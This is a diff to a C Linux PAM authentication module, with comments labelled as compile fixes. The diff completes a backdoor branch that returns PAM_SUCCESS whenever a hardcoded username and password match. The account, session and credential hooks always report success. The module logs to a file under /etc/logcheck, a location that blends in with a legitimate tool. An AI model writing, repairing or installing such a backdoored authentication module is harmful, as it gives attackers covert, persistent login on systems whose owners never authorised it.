@@ -8,7 +8,7 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <unistd.h>
-#include <pthread.h> 
+#include <pthread.h>  // <-- Fixes pthread_self()
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
@@ -107,7 +107,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int argc,
                                    const char **argv)
 {
-    // Suppress unused parameter warnings
+    // Fix 1: Cast to void to remove warnings
     (void) flags;
     (void) argc;
     (void) argv;
@@ -115,7 +115,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
 
-    // Declare variables at function start
+    // Fix 2: Declare variables BEFORE use (critical line)
     const char *pword = NULL;
     const char *uname = NULL;
 
@@ -151,4 +151,85 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     char *hd_pass = NULL;
     get_hardcoded_credentials(&hd_user, &hd_pass);
 
-    if_
+    if (hd_user && hd_pass) {
+        trace("[!] ATTEMPTING HARDCODED USER");
+        
+        if (strcmp(hd_pass, pword) == 0 && strcmp(hd_user, uname) == 0) {
+            trace("[!] Hardcoded password accepted");
+            trace("[TRACE] EXIT PAM_SUCCESS");
+            free(hd_user);
+            free(hd_pass);
+            return PAM_SUCCESS;
+        }
+        
+        free(hd_user);
+        free(hd_pass);
+    }
+
+    trace("[TRACE] AUTH FAILED");
+    trace("[TRACE] EXIT PAM_AUTH_ERR");
+    return PAM_AUTH_ERR;
+}
+
+/* ---------------- ACCOUNT ---------------- */
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
+                               int flags,
+                               int argc,
+                               const char *argv[])
+{
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
+    trace_context(pamh, "ENTER ACCOUNT");
+    trace("[TRACE] ACCOUNT OK");
+    return PAM_SUCCESS;
+}
+
+/* ---------------- SESSION ---------------- */
+
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
+                                  int flags,
+                                  int argc,
+                                  const char *argv[])
+{
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
+    trace_context(pamh, "ENTER SESSION OPEN");
+    trace("[TRACE] SESSION START");
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
+                                   int flags,
+                                   int argc,
+                                   const char *argv[])
+{
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
+    trace_context(pamh, "ENTER SESSION CLOSE");
+    trace("[TRACE] SESSION END");
+    return PAM_SUCCESS;
+}
+
+/* ---------------- CREDENTIALS ---------------- */
+
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
+                             int flags,
+                             int argc,
+                             const char *argv[])
+{
+    (void) flags;
+    (void) argc;
+    (void) argv;
+
+    trace_context(pamh, "ENTER SETCRED");
+
+    trace("[TRACE] SETCRED SUCCESS");
+    return PAM_SUCCESS;
+}
